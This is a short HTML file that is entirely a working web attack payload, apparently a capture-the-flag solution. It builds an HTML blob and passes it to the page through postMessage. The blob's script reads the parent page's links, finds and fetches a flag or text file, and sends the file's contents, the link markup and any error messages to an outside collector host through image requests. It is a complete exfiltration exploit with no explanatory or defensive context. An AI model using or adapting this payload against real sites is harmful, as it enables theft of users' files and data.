<html><body><script>
(async () => {
  const epic = `
    <script>
      (async () => {
        try {
          const links = [...parent.document.querySelectorAll('a')];
          const mapped = links.map(x => x.outerHTML).join('--');
          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=links_' + encodeURIComponent(mapped.slice(0, 500));

          const a = links.find(x => 
            /file-.*\\.txt$/.test(x.id || '') ||
            /file-.*\\.txt$/.test(x.href || '') ||
            /flag\\.txt$/.test(x.textContent || '')
          );

          if (!a) {
            new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
            return;
          }

          const res = await fetch(a.href);
          const txt = await res.text();

          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(txt);
        } catch (e) {
          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=error_' + encodeURIComponent(e.message);
        }
      })();
    <\/script>`;
  
  const blob = new Blob([epic], { type: 'text/html' });

  window.postMessage({
    type: 'share',
    files: [{ blob, name: 'epic.html', cached: false }]
  }, '*');
})();
</script></body></html>
